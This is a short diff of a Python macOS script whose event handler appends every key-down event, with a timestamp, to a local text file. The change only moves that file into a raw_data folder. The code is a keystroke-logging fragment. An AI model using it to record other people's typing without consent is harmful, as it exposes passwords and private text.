@@ -13,7 +13,7 @@ class AppDelegate(NSObject):
 def handler(event):
     try:
         if event.type() == NSKeyDown:
-            with open('output.txt', 'a+') as f:
+            with open('./raw_data/output.txt', 'a+') as f:
                 f.write(strftime("%Y-%m-%d %H:%M:%S", gmtime()) + " " + str(event) + "\n")
     except ( KeyboardInterrupt ) as e:
         print e
